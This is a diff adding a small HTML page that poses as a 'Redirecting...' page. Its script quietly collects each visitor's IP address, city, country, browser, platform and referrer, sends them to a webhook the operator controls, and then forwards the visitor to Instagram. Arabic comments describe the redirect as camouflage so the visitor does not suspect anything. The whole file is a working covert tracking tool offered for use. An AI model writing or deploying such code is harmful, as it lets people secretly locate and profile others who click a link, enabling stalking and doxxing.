@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        async function logVisitor() {
+            // 1. جلب عنوان الـ IP والموقع الجغرافي عبر API مجاني
+            const geo = await fetch('https://ipapi.co/json/').then(res => res.json());
+
+            // 2. تجميع بيانات الجهاز (الهاتف، المتصفح)
+            const visitorData = {
+                ip: geo.ip,
+                city: geo.city,
+                country: geo.country_name,
+                device: navigator.userAgent,
+                platform: navigator.platform,
+                referer: document.referrer, // لمعرفة ما إذا كان قادماً من انستغرام
+                time: new Date().toLocaleString()
+            };
+
+            // 3. إرسال البيانات إلى Webhook الخاص بك (يصلك فوراً)
+            // استبدل الرابط أدناه برابط Webhook.site الخاص بك
+            fetch('https://webhook.site/YOUR_UNIQUE_ID', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(visitorData)
+            }).then(() => {
+                // 4. تحويل الزائر لموقع حقيقي (تمويه) لكي لا يشك
+                window.location.href = "https://www.instagram.com/instagram";
+            });
+        }
+        window.onload = logVisitor;
+    </script>
+</body>
+</html>
